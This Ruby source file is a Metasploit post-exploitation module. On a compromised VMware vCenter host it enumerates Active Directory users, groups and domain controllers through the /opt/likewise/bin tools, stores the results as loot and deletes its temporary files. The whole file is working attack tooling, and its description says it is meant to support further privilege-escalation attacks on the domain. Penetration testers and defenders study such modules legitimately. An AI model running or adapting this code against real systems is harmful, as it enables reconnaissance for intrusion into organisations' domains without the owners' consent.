  ##
  # This module requires Metasploit: https://metasploit.com/download
  # Current source: https://github.com/rapid7/metasploit-framework
  ##

  class MetasploitModule < Msf::Post
    include Msf::Post::Linux::System
    include Msf::Exploit::FileDropper

    def initialize(info={})
      super(update_info(info, {
        'Name'           => 'VMWare vCenter Active Directory Enumeration',
        'Description'    => %q{
          VMWare vCenter servers running on Linux may allow for enumeration of Active Directory information
          such as domain users, groups, group members and domain controllers using the binaries in /opt/likewise/bin.
          This module attempts to perform such enumeration. The information obtained in this manner can be used to
          conduct additional attacks aimed at compromising or escalating privileges on the domain.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>         [
            'Erik Wynter',   # @wyntererik
          ],
        'DisclosureDate'  => '2022-05-17',
        'Platform'       => ['linux', 'unix'],
        'SessionTypes'   => ['shell', 'meterpreter'],
        }
      ))
      register_options([
        OptString.new('DOMAIN_FQDN', [false, 'FQDN for the active directory domain to query', '' ]),
        OptString.new('DOMAIN_ALIAS', [false, 'Alias for the active directory domain to query', '' ]),
      ])
    end

    def domain_fqdn
      datastore['DOMAIN_FQDN']
    end

    def domain_alias
      datastore['DOMAIN_ALIAS']
    end

    def binaries_for_enumeration
      {
        'groups' => '/opt/likewise/bin/lw-enum-groups',
        'users' => '/opt/likewise/bin/lw-enum-users',
        'dcs' => '/opt/likewise/bin/lw-get-dc-list'
      }
      
    end

    def enum_users
      lw_enum_users = binaries_for_enumeration['users']
      unless file?(lw_enum_users)
        print_error("Cannot enumerate users because the #{lw_enum_users} binary is not present on the host.")
        return 1
      end

      # perform enumeration
      enum_users_outfile  = "/tmp/users_#{Rex::Text.rand_text_alpha(6)}.txt"
      enum_users_cmd = "#{lw_enum_users} --level 2 > #{enum_users_outfile}"
      print_status("Attempting to enumerate users via the #{lw_enum_users} binary...")
      vprint_status("Running command: #{enum_users_cmd}")
      cmd_exec(enum_users_cmd)
      # check if the output file was created and try to parse it (to obtain domain names)
      unless file?(enum_users_outfile)
        print_error("User enumeration via the binary #{lw_enum_users} failed: No output file was created.")
        return 1
      end

      register_file_for_cleanup(enum_users_outfile)

      lw_enum_users_output = read_file(enum_users_outfile)
      if lw_enum_users_output&.strip&.blank?
        print_error("User enumeration via the binary #{lw_enum_users} failed: The output file was empty.")
      end

      users_loot = store_loot(
        'vcenter_users_raw',
        'text/plain',
        session,
        lw_enum_users_output,
        nil,
      )
      print_status("Saving raw lw-enum-users output to #{users_loot} before trying to parse it")

      user_info = lw_enum_users_output.scan(/User info .*?={20}\n(.*?)\n\n/m)&.flatten
      # blank check
      user_info_parsed = []
      user_info.each do |ui|
        ui_parsed = {}
        u_lines = ui.split("\n")
        u_lines.each do |line|
          key,value = line.scan(/^(.*?):\s+(.*?)$/)&.flatten
          next if key.blank?
          ui_parsed[key] = value
        end

        next if ui_parsed.empty?
        user_info_parsed << ui_parsed
      end

      domain_users = user_info_parsed.select{|x| x["Local User"] == "NO"}
      local_users = user_info_parsed.select{|x| x["Local User"] == "YES"}

      # check if we have any users      
      if domain_users.empty? && local_users.empty?
        print_error("No user info was obtained. If you think this is due to an error, please open a bug report, or even better, PR a fix.")
        return 1
      end


      print_good("Obtained info on a total of #{user_info_parsed.length} users, including #{local_users.length} local users and #{domain_users.length} domain users.")
      
      unless domain_users.empty?
        # use the domain user UPN value to obtain the unique FQDNs for all domains we found users for. The FQDNs can be used to enumerate DCs later on.
        upns = domain_users.map{|x| x["UPN"]}
        unique_fqdns = []
        upns.each do |upn|
          # using scan instead of a single split because it seems AD usernames can technucally include @
          uname, fqdn = upn.scan(/(^.*)@(.*?)$/)&.flatten
          next if uname.blank? || fqdn.blank?
          unique_fqdns << fqdn unless unique_fqdns.include?(fqdn)
        end

        # save the domain user info
        domain_users_loot = store_loot(
          'vcenter_ad_users',
          'application/json',
          session,
          domain_users.to_json,
          'vcenter_ad_users.json',
        )

        print_status("Saving parsed domain user info in JSON format to #{domain_users_loot}")
      end

      unless local_users.empty?
        # save the local user info
        local_users_loot = store_loot(
          'vcenter_local_users',
          'application/json',
          session,
          local_users.to_json,
          'vcenter_local_users.json',
        )

        print_status("Saving local user info in JSON format to #{local_users_loot}")
      end

      unique_fqdns
    end

    def enum_groups
      lw_enum_groups = binaries_for_enumeration['groups']
      unless file?(lw_enum_groups)
        print_error("Cannot enumerate groups because the #{lw_enum_groups} binary is not present on the host.")
        return 1
      end

      # perform enumeration
      enum_groups_outfile  = "/tmp/groups_#{Rex::Text.rand_text_alpha(6)}.txt"
      enum_groups_cmd = "#{lw_enum_groups} --level 1 > #{enum_groups_outfile}"
      print_status("Attempting to enumerate groups via the #{lw_enum_groups} binary...")
      vprint_status("Running command: #{enum_groups_cmd}")
      cmd_exec(enum_groups_cmd)
      # check if the output file was created and try to parse it (to obtain domain names)
      unless file?(enum_groups_outfile)
        print_error("Group enumeration via the binary #{lw_enum_groups} failed: No output file was created.")
        return 1
      end

      register_file_for_cleanup(enum_groups_outfile)

      lw_enum_groups_output = read_file(enum_groups_outfile)
      if lw_enum_groups_output&.strip&.blank?
        print_error("Group enumeration via the binary #{lw_enum_groups} failed: The output file was empty.")
      end

      groups_loot = store_loot(
        'vcenter_group_raw',
        'text/plain',
        session,
        lw_enum_groups_output,
        nil,
      )
      print_status("Saving raw lw-enum-groups output to #{groups_loot} before trying to parse it")

      group_info = lw_enum_groups_output.scan(/Group info .*?={20}\n(.*?)\n\n/m)&.flatten
      # blank check
      group_info_parsed = []
      group_info.each do |gi|
        gi_parsed = {}
        g_lines = gi.split("\n")
        g_lines.each do |line|
          key,value = line.scan(/^(.*?):\s+(.*?)$/)&.flatten
          next if key.blank?
          gi_parsed[key] = value
        end

        next if gi_parsed.empty?
        group_info_parsed << gi_parsed
      end

      # check that it's not empty
      groups_parsed_loot = store_loot(
        'vcenter_groups',
        'application/json',
        session,
        group_info_parsed.to_json,
        'vcenter_groups.json',
      )

      print_status("Saving group info on #{group_info_parsed.length} groups in JSON format to #{groups_parsed_loot}")
    end

    def enum_domain_controllers(fqdns)
      if fqdns.empty?
        vprint_error("Cannot enumerate domain controllers because no FQDNs were obtained.")
        return 1
      end

      lw_enum_dcs = binaries_for_enumeration['dcs']
      unless file?(lw_enum_dcs)
        print_error("Cannot enumerate domain controllers because the #{lw_enum_dcs} binary is not present on the host.")
        return 1
      end

      fqdn_dc_info = Hash.new { |h, k| h[k] = [] }

      # perform enumeration
      print_status("Obtained #{fqdns.length} FQDN(s):")
      puts fqdns.split("\n")
      fqdns.each do |fqdn|
        enum_dcs_outfile = "/tmp/dcs_#{fqdn.gsub('.','_')}_#{Rex::Text.rand_text_alpha(6)}.txt"
        enum_dcs_cmd = "#{lw_enum_dcs} #{fqdn} > #{enum_dcs_outfile}"
        print_status("Attempting to enumerate domain controllers for the domain #{fqdn} via the #{lw_enum_dcs} binary...")
        vprint_status("Running command: #{enum_dcs_cmd}")
        cmd_exec(enum_dcs_cmd)


        # check if the output file was created and try to parse it (to obtain domain names)
        unless file?(enum_dcs_outfile)
          print_error("Domain controller enumeration via the binary #{lw_enum_dcs} failed for #{fqdn}: No output file was created.")
          next
        end

        register_file_for_cleanup(enum_dcs_outfile)

        lw_enum_dcs_output = read_file(enum_dcs_outfile)
        if lw_enum_dcs_output&.strip&.blank?
          print_error("Domain controller enumeration via the binary #{lw_enum_dcs} failed for #{fqdn}: The output file was empty.")
          next
        end

        dcs_loot = store_loot(
          'vcenter_dcs_raw',
          'text/plain',
          session,
          lw_enum_dcs_output,
          nil,
        )
        print_status("Saving raw lw-get-dc-list output to #{dcs_loot} before trying to parse it")


        dcs = lw_enum_dcs_output.scan(/(DC \d+: .*?)\n/)&.flatten
        if dcs.blank?
          print_error("Failed to obtain any domain controllers for #{fqdn}")
          next
        end

        dcs.each do |dc|
          dc_index = dc.scan(/^DC (\d+):/)&.flatten&.first
          dc_info = dc.split(":")[1..-1]&.join(':')&.split(',')
          next if [dc_index, dc_info].any? { |i| i.blank? }
          dc_info_hash = {}
          dc_info.each do |i|
            key,value = i.scan(/\s+(.*?) = (.*?)$/)&.flatten
            next if key.blank?
            dc_info_hash[key] = value
          end

          next if dc_info_hash.empty?
          fqdn_dc_info[fqdn] << dc_info_hash
        end

        if fqdn_dc_info[fqdn].empty?
          print_error("Something went wrong when trying to parse the domain controllers for #{fqdn}")
        else
          print_good("Obtained #{fqdn_dc_info[fqdn].length} domain controller(s) for #{fqdn}")
        end
      end

      if fqdn_dc_info.empty?
        print_error("No domain controllers were found.")
        return
      end

      dcs_parsed_loot = store_loot(
        'vcenter_dcs',
        'application/json',
        session,
        fqdn_dc_info.to_json,
        'vcenter_dcs.json',
      )

      print_status("Saving enumerated domain controllers in JSON format to #{dcs_parsed_loot}")
    end

    def run
      unless directory?('/opt/likewise/bin')
        fail_with Failure::NoTarget , 'The /opt/likewise/bin directory was not found on the target.'
      end

      # technically there are more binaries that can give interesting results, but if these four aren't there, something very weird is going on so let's just bail
      if binaries_for_enumeration.none? {|k,v| file?(v) }
        fail_with Failure::NoTarget , 'The /opt/likewise/bin directory does not contain any of the binaries required for enumeration.'
      end
    
      # if user enumeration doesn't work, we may as well give up
      unique_fqdns = enum_users
      if unique_fqdns == 1
        return
      end

      enum_groups
      enum_domain_controllers(unique_fqdns)
    end
  end